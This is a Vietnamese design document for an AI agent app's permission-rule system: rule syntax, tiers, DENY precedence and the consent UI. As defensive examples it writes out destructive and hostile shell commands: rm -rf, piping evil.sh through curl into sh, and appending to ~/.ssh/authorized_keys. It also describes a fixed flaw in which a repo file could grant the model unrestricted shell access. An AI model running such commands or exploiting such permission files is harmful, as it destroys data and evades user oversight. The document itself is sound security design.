# Luật quyền (permission rules)

> Quyết định kiến trúc: [ADR 0080](../decisions/0080-command-scoped-permission-rules.md).
> Code: `apps/desktop/sidecar/src/sessions/permission-rules.ts`, `src/runtime/permission.ts`, `src/methods/sessions.permission.ts`.

## Vấn đề

Trước đây "Always allow" nhớ **theo tên tool**. Cho phép `git status` một lần ⇒ mọi lệnh `Bash` trong phiên chạy không hỏi, kể cả `rm -rf ~` hay `curl … | sh`. Người dùng đọc một thứ, cấp một thứ khác.

Giờ mỗi lần đồng ý sinh ra một **luật gắn với nội dung** lời gọi tool, và luật đó được hiện ra để đọc trước khi bấm.

## Cú pháp luật

```
ToolName                 # chỉ cho tool không có tham số quyết định mức nguy hiểm
ToolName(pattern)
```

| Ví dụ | Khớp |
|---|---|
| `Bash(git status)` | đúng chuỗi `git status` |
| `Bash(npm run *)` | `npm run build`, `npm run test --watch` — **không** khớp `npm run` |
| `Write(/repo/src/**)` | mọi file dưới `/repo/src` |
| `Edit(/repo/*.ts)` | `/repo/a.ts` — **không** khớp `/repo/src/a.ts` (`*` không vượt `/`) |
| `RunWorkflow` | mọi lời gọi `RunWorkflow` |

Quy tắc:

- **Không có ký tự đại diện ngầm.** Không `*` ⇒ so khớp nguyên văn. `Bash(git status)` **không** khớp `git statuses`.
- Chỉ có `*` (và `**` cho đường dẫn). Không regex, không `?`, không lớp ký tự.
- Kind `command`: `*` khớp mọi ký tự. Kind `path`: `*` không vượt `/`, `**` thì vượt.
- Khoảng trắng so khớp **nguyên văn** — `git  status` (2 dấu cách) không khớp `Bash(git status)`, chỉ đơn giản là hỏi lại.
- Luật đường dẫn phải **tuyệt đối** (hoặc mở đầu bằng `*`) và không được chứa `..`.
- `Bash`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit` **bắt buộc có pattern** — luật trần cho các tool này bị từ chối (đó chính là lỗ hổng cũ).

### Bảng tool → tham số khoá luật

| Tool | Khoá theo | Kind | Luật trần? |
|---|---|---|---|
| `Bash` | `command` | `command` | ✗ (bị từ chối) |
| `Write` / `Edit` / `MultiEdit` | `file_path` | `path` | ✗ (bị từ chối) |
| `NotebookEdit` | `notebook_path` | `path` | ✗ (bị từ chối) |
| `Read` / `Grep` / `Glob` (chỉ có nghĩa khi DENY) | `file_path` / `path` | `path` | ✓ |
| còn lại (`RunWorkflow`, `WebFetch`, source/wiki/browser, `mcp__*`…) | — | `bare` | ✓ |

## Lệnh ghép luôn phải hỏi

Nếu lệnh chứa bất kỳ ký tự nào trong ``; & | ` $ < > ( ) { } \ !`` hoặc ký tự điều khiển (xuống dòng, CR, NUL…) thì:

- **không luật nào khớp** ⇒ luôn hỏi người dùng;
- **không hiện nút "Always allow"** (không có luật nào an toàn để nhớ).

Nhờ đó `git status; rm -rf /`, `git status && curl evil.sh | sh`, `` git status `rm -rf /` ``, `git status $(…)`, `git status > ~/.ssh/authorized_keys` đều **không** khớp `Bash(git status)`.

Quét là quét thô, không phân biệt trong/ngoài dấu nháy: `echo "a;b"` cũng bị coi là lệnh ghép ⇒ hỏi. Nhận nhầm thì chỉ tốn một lần hỏi; bỏ sót thì mất quyền kiểm soát.

## Ba tầng

| Tầng | File | Vòng đời |
|---|---|---|
| `session` | (bộ nhớ) | tới khi hết phiên / xoá phiên |
| `project` | `~/.awog/permission-rules/<sha256(đường dẫn project)[0..32]>.json` | bền vững, **chỉ trên máy này** |
| `user` | `~/.awog/permission-rules.json` | bền vững toàn máy |

Áp theo thứ tự `session → project → user`. **DENY thắng ALLOW ở mọi tầng** — kể cả khi phiên đang ở `execute` mode, bật auto-approve, hay SSH đang ở `auto`.

### Luật project KHÔNG nằm trong repo

Tầng `project` từng đọc `{project}/.awog/permission-rules.json`, tức một file **trong repo**. Bất kỳ ai commit được vào repo cũng cấp được quyền: `{"rules":[{"rule":"Bash(*)"}]}` là người clone repo đó để model chạy mọi lệnh shell không hỏi. Bản vá 2026-09-07 (F1 của infosec audit) chuyển tầng này vào AWOG home, đặt tên file bằng **băm sha256 của đường dẫn tuyệt đối** đã chuẩn hoá.

- Ngữ nghĩa là "dự án này **trên máy này**" — quyền không bao giờ đi theo git sang máy người khác.
- Tên file chỉ gồm `[0-9a-f]{32}` (an toàn theo cấu tạo, không nhận đường dẫn thô). Bên trong file có field `projectPath` chỉ để người đọc nhận ra file thuộc dự án nào; nó không được dùng để giải ra đường dẫn.
- Đổi tên / di chuyển thư mục project ⇒ khoá khác ⇒ luật cũ hết áp dụng, hệ thống hỏi lại từ đầu.
- File cũ trong repo (nếu còn) **bị bỏ qua**, chỉ ghi một dòng `log.warn`. **Không migrate tự động** — chính nội dung đó là thứ không đáng tin. Muốn giữ thì tự chép sang, tức phải đọc nó trước.

### DENY áp cho MỌI tool

Luật `deny` được tra **trước mọi nhánh thoát sớm** của cổng quyền, nên nó áp cho cả những tool không bao giờ hỏi: `Read`, `Grep`, `Glob`, `WebFetch`, `Task`, tool SSH (kể cả khi `sshApprovalMode = auto`) và mọi `mcp__*`. Nhánh ALLOW thì giữ nguyên vị trí cũ — nó chỉ bỏ qua một prompt, mà tool không bị gate thì vốn không prompt.

`Read` / `Grep` / `Glob` nhận **cả hai dạng** luật: trần (`Read` = cấm đọc tất cả) và theo đường dẫn (`Read(/Users/x/.ssh/**)`). Đây là ngoại lệ có chủ đích so với `Bash`/`Write` — ba tool này không bị gate nên luật của chúng chỉ có nghĩa theo chiều DENY.

Tool MCP bắc cầu phải viết đúng tên đang chạy (`mcp__<id>__<tool>`); riêng nhóm SSH được đối chiếu thêm tên trần (`ssh_exec`) để một luật dùng chung cho cả hai runtime.

### Định dạng file

```json
{
  "version": 1,
  "rules": [
    { "rule": "Bash(pnpm lint)", "action": "allow", "createdAt": "2026-09-06T02:00:00.000Z" },
    { "rule": "Bash(rm -rf /)", "action": "deny" }
  ]
}
```

`action` vắng ⇒ `allow`. Tối đa 500 luật/file. Ghi bằng atomic rename, quyền `0600`.

Validate theo **từng entry**: một entry sai cú pháp (kể cả typo `"action": "alow"`) bị **bỏ qua + ghi log**, các entry còn lại **vẫn có hiệu lực** — trước đây validate cả file nên một typo xoá sổ mọi luật DENY trong file (fail-open, F2). File hỏng toàn phần (JSON sai, `rules` không phải mảng) coi như rỗng.

Khi ghi mà file hiện tại **không parse được**, sidecar **từ chối ghi đè** và ném lỗi nêu đường dẫn — đè lên file hỏng là xoá vĩnh viễn guardrail người dùng đã viết. Lượt chat không bị treo (RPC bắt lỗi này), chỉ là "không lưu được luật" cho tới khi người dùng tự sửa file. Lúc ghi, các entry đang có được giữ **nguyên văn**, kể cả entry hỏng.

Đây là cách duy nhất hiện tại để tạo luật `deny` hoặc luật có ký tự đại diện: sửa tay file. Nút "Always allow" **chỉ** sinh luật nguyên văn, không bao giờ sinh `*`.

## Luồng đồng ý

1. Cổng quyền (`runtime/permission.ts`) chuẩn bị luật gợi ý cho lời gọi này. Không sinh được luật an toàn ⇒ không có suggestion ⇒ UI không hiện "Always allow".
2. Event `session.permission-request` mang `suggestions[0]`:
   `{ type: 'addRule', toolName, rule: 'Bash(git status)', ruleKind: 'command', action: 'allow', destination: 'session', sessionId }`.
   UI **hiển thị `rule`** — đó là thứ người dùng đang cấp.
3. UI gọi `sessions.permission` với `{ requestId, decision, alwaysAllow?, scope? }`. `scope` ∈ `session | project | user`, vắng ⇒ `session`.
4. Sidecar ghi luật (lấy nội dung **từ suggestion đã park**, không từ payload UI) rồi trả `{ resolved, savedScopes }`. Xin `project` mà phiên không thuộc project nào ⇒ hạ về `session` và nói rõ trong `savedScopes`.

## Thẻ xin quyền trên UI

Code: [`components/session/SessionGateCard.vue`](../../apps/desktop/ui-next/components/session/SessionGateCard.vue) (nhánh `perm`) + [`composables/useSessionPermissionRule.ts`](../../apps/desktop/ui-next/composables/useSessionPermissionRule.ts). Chuỗi ở `i18n/locales/{en,vi}/sessions-perm.json` (prefix `sessionsPerm.`).

Khi thẻ còn `pending`, thứ tự đọc là **luật → phạm vi → nút**:

1. **Luật sắp cấp, nguyên văn.** In đúng `suggestion.rule` (`Bash(git status)`) bằng font code, chọn/copy được, render bằng text node (dữ liệu L1, không `v-html`). Kèm một câu nói luật khớp cái gì, theo `ruleKind`: `command` → "khớp đúng lệnh này, không phải mọi lệnh Bash", `path` → "khớp đúng đường dẫn này", `bare` → "khớp mọi lời gọi tool này".
2. **Bộ chọn phạm vi** (`AppSelect`): *Phiên này* / *Dự án này* / *Mọi dự án* ⇒ `scope` = `session | project | user`. **Mặc định `session`** (ít quyền nhất). Mỗi mức có một dòng nói hệ quả (quên khi hết phiên / ghi vào `.awog/permission-rules.json` của dự án / ghi vào `~/.awog/permission-rules.json`). Phiên không thuộc project nào ⇒ mục *Dự án này* bị **disable** kèm chú thích, không im lặng rơi về `session`.
3. **Nút "Always allow" chỉ hiện khi có luật.** Không có suggestion (lệnh ghép, đường dẫn tương đối…) ⇒ nút **không được render**, thay bằng một dòng nói vì sao lần này chỉ cho phép một lần. UI cũng coi trường hợp *không nhận được suggestion* (event tới trước khi cửa sổ kịp lắng nghe) là "không có luật" — thà hỏi lại còn hơn đoán ra một luật mà người dùng chưa từng đọc.
4. **Sau khi lưu**, thẻ nói tầng THẬT SỰ đã ghi theo `savedScopes` trả về, kèm lại chuỗi luật; bị hạ cấp `project → session` thì nói rõ; `savedScopes` rỗng (ghi hỏng) thì báo "không lưu được luật — lượt sau vẫn hỏi".

Nợ kỹ thuật đã biết: store `sessions` chưa mang `suggestions` từ event xuống `PermBlock` và `setPermission()` chưa có tham số `scope`, nên composable phải tự lắng nghe `session.permission-request` để lấy chuỗi luật và tự gửi lượt trả lời có `scope` (store gửi thêm một lượt nữa — sidecar đã unpark nên đó là no-op, và suggestion đã tiêu thụ nên không thể ghi luật lần hai). Dọn bằng cách thêm `suggestion` vào `PermBlock` + `scope` vào `setPermission`.

## Giới hạn đã biết

- Luật `deny` chỉ khớp lệnh đơn: `foo && rm -rf /` không khớp `Bash(rm -rf /)` — nhưng nó rơi vào "hỏi", không phải "cho qua".
- Chủ thể chứa `*` thật (vd `git add *`) không được gợi ý làm luật (ngữ pháp không có cơ chế escape).
- Chưa có trang xem/xoá luật đã lưu ⇒ gỡ một luật `project`/`user` vẫn phải sửa tay file JSON, mà tên file tầng project giờ là băm nên khó tự đoán. Bộ chọn tầng thì đã có trên thẻ xin quyền (xem trên).
- Chuỗi i18n của thẻ xin quyền (`sessionsPerm.hint.project`) còn nói "ghi vào `.awog/permission-rules.json` của dự án" — sai kể từ bản vá F1, cần đổi thành "ghi trong AWOG home, chỉ áp trên máy này".
- Đánh giá có trần cứng 1500 luật mỗi lần; vượt trần ⇒ hỏi (không bao giờ tự cho qua).
- Cổng SSH (ADR 0064) giữ allowance riêng theo `(phiên, host, tool)`, không đi qua hệ luật này.
